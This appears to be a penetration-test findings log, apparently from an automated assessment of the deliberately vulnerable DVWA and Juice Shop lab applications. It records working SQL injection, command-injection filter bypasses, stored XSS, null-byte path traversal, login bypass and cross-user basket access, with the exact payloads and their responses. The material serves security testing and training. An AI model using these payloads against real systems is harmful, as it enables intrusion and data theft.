findings.title: DVWA SQL Injection (low) - boolean-based via id parameter
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned HTTP 200 with 5 records: 'First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE payload id=1' AND '1'='2 returned HTTP 200 with zero records (only 'User ID: ' with no 'ID:/First name/Surname' entries). Surnames recorded: Admin(admin), Brown, Me, Picasso, Smith.

findings.title: DVWA OS Command Injection (low) - ip parameter, ; whoami
findings.response_evidence: [security=low] HTTP 200. Ping output shows 4 packets transmitted/received from 127.0.0.1, followed by the injected command output line 'www-data' (appears before 'More Information').

findings.title: DVWA Stored XSS (low) - guestbook message executes script
request_sequence: browser_navigate http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) -> HTTP 200, stored entry rendered
findings.response_evidence: [security=low] POST response 200 shows the guestbook entry 'Name: xsstest' stored (the rendered message body is a script tag, which the text summary strips). Subsequent browser load of /vulnerabilities/xss_s/ in dvwa_admin executed the stored payload.

findings.title: Product-Search SQL Injection (q parameter) on /rest/products/search
findings.response_evidence: Baseline q=apple: HTTP 200 application/json {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)",...},{"id":24,"name":"Apple Pomace",...}]} with no error. q=qwert': HTTP 500 text/html "Error: SQLITE_ERROR: near \"'%'\": syntax error". q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} — attacker-chosen columns reflected in the product output, proving UNION injection into the query.</response_evidence>

findings.title: Login Authentication-Bypass SQL Injection on POST /rest/user/login (email field)
findings.response_evidence: HTTP 200 application/json {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}} — valid authentication token issued for the first user (admin@juice-sh.op) without valid credentials.

findings.title: Unauthenticated User-Feedback Data Exposure on GET /api/Feedbacks (only masked emails)
findings.response_evidence: HTTP 200 application/json {"status":"success","data":[8 records]} returned without authentication, each with UserId, id, comment, rating, createdAt, updatedAt. Author emails appear only partially masked inside comment text, e.g. "(***in@juice-sh.op)", "(***ereum@juice-sh.op)", "(***der@juice-sh.op)"; anonymous entries show "(anonymous)" with UserId null. No full author email address and no separate email field is disclosed. Unauthenticated access to user-linked feedback is confirmed, but the assignment criterion (full author email addresses disclosed) is not met, so the PII-disclosure verdict is inconclusive; partial masked fragments and the UserId linkage are the leak to weigh.

findings.title: Open directory listing of /ftp/ exposes confidential acquisitions.md
findings.response_evidence: HTTP 200, content-type text/html; visible listing "listing directory /ftp/" enumerates files including "acquisitions.md 909" (also announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml, quarantine). Links to http://juiceshop:3000/ftp/acquisitions.md are present in the listing HTML. No authentication was required.

findings.title: Confidential acquisition memo retrievable unauthenticated from /ftp/acquisitions.md
request_sequence: GET http://juiceshop:3000/ftp/ (session=unauth, Accept: text/html,application/json) -> listing shows acquisitions.md
findings.response_evidence:
HTTP 200, content-type text/markdown. Body excerpt: "# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact as we will elaborate in detail in the following paragraph:" ... "Our shareholders will be excited. It's true. No fake news." The listing reveals the file and direct retrieval returns the confidential memo text.

findings.title: Browsable /encryptionkeys/ directory exposes premium.key and jwt.pub
findings.response_evidence: HTTP 200, content-type text/html. Visible text: "listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM". Links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key are present. Directory is browsable without authentication.

findings.title: Poison null-byte path traversal bypasses /ftp/ file-type filter to read package.json backup
findings.response_evidence:
Raw path: HTTP 403 'Error: Only .md and .pdf files are allowed!'. Null-byte path: HTTP 200, content_type application/octet-stream, body begins: '{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}'. Restricted backup file content retrieved via null-byte bypass.

findings.title: [security=high] SQL injection via session-input.php id parameter (out-of-band into /vulnerabilities/sqli/)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> user_token=[REDACTED] ; security.php already at low
POST http://dvwa/security.php security=high&seclev_submit=Submit&user_token=[REDACTED] -> 302 to /security.php; re-GET shows 'Security level is currently: high'
findings.response_evidence: [security=high] Security level confirmed high on /security.php ('Security level is currently: high'; 'Security level set to high'). TRUE payload id=1' OR '1'='1' # via session-input.php, then GET /vulnerabilities/sqli/ returned 5 records: 'ID: 1' OR '1'='1' # First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE control id=1' AND '1'='2' # then GET /vulnerabilities/sqli/ returned NO records (only 'Click here to change your ID' and footer). Note: session_info field reported security_level 'low' but the DVWA page body itself states 'Security level is currently: high' and 'Security Level: high'.

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/{basketId}
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct1; session_info.own_basket_id=6, email acct1_bench@juiceshop.local)
GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct2; session_info.own_basket_id=7, email acct2_bench@juiceshop.local)
findings.response_evidence: Acct1 (own basket 6) response: status success, data.id=6, UserId=22, Products=[{name:"Apple Juice (1000ml)", id:1, BasketItem quantity:3, BasketId:6}]. Acct2 (own basket 7) request for basket 6 returned HTTP 200 with identical body: data.id=6, UserId=22, Products=[{name:"Apple Juice (1000ml)", BasketItem quantity:3}]. Acct2 is not the owner (UserId 22 belongs to acct1), so cross-user access to another user's basket is confirmed.

findings.title: Cross-site request forgery on DVWA security level change (POST /security.php) - not exploited
request_sequence: GET http://dvwa/security.php (dvwa_admin) observed form with hidden user_token (observation only, from prior mapping)
findings.response_evidence: Not exploited. Per coordinator scope, this endpoint was treated only as a supporting endpoint for level changes; no standalone CSRF test was run and no anti-CSRF bypass was demonstrated. The form carries a per-form user_token, so a cross-origin forged POST without a valid token is not shown to succeed. Rejected as a standalone CSRF finding; no budget spent on it.

findings.title: [security=medium] OS Command Injection in DVWA Ping form via pipe bypass of ';' and '&&' blacklist
request_sequence: GET http://dvwa/vulnerabilities/exec/ -> page shows 'Security level set to medium' / 'Security Level: medium'
findings.response_evidence: [security=medium] HTTP 200 from POST /vulnerabilities/exec/ with ip='127.0.0.1| whoami'. The ping output block reads 'Enter an IP address: www-data' — the web-process identity www-data is present in command output. Page shows 'Security Level: medium'. Pipe '|' was not blocked at medium (';' and '&&' are the medium blacklist).

findings.title: Unauthenticated access to user feedback listing (author email exposure only masked) on /api/Feedbacks
findings.response_evidence: Unauthenticated request returned 200 with 8 feedback records (UserId, id, comment, rating, createdAt, updatedAt). Author emails appear only inside comment text and are masked (e.g. 'I love this shop! ... (***in@juice-sh.op)', '(***ereum@juice-sh.op)'); anonymous entries show '(anonymous)' with UserId null. No unmasked author email address or separate email field is disclosed, so the CWE-359 PII criterion is not met. Unauthenticated listing exposure is confirmed, but PII disclosure is not; verdict inconclusive per instruction.

findings.title: Cross-user basket access (BOLA) on GET /rest/basket/{basketId}: acct2 reads acct1's basket 6
findings.response_evidence: HTTP 200 as juiceshop_acct2 (own_basket_id=7): {"status":"success","data":{"id":6,"coupon":null,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3,...}}]}}. Basket 6 is not acct2's own basket (acct2 owns basket 7), yet its contents (Apple Juice (1000ml), quantity 3) were returned. Basket 6 ownership by acct1 is per the prior Coordinator-recorded evidence (acct1 own basket 6 contains Apple Juice 1000ml); this verification did not re-issue the acct1 request.

findings.title: [security=high] OS Command Injection via ip parameter (pipe without trailing space bypass)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> page body 'Security level is currently: high', user_token=[REDACTED]
findings.response_evidence: [security=high] HTTP 200 from POST /vulnerabilities/exec/ with ip=127.0.0.1|whoami (no trailing space). Page body under 'Ping a device' output contains 'www-data' (pre_blocks: ['www-data']). Page footer reads 'Security Level: high'. Note: session_info still reports security_level=low; the page body is authoritative. Payload uses the pipe-without-space bypass required at high.

findings.title: Unauthenticated user-feedback listing: author emails not disclosed in clear form
findings.response_evidence: HTTP 200 application/json, {"status":"success","data":[...8 records]}. Record fields: UserId, id, comment, rating, createdAt, updatedAt. No author email field. Comment-embedded emails are masked: '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)'. Anonymous records have UserId null and '(anonymous)'. No unmasked email address appears anywhere in the response, so CWE-359 is not supported. Unauthenticated access works but PII disclosure is not demonstrated.
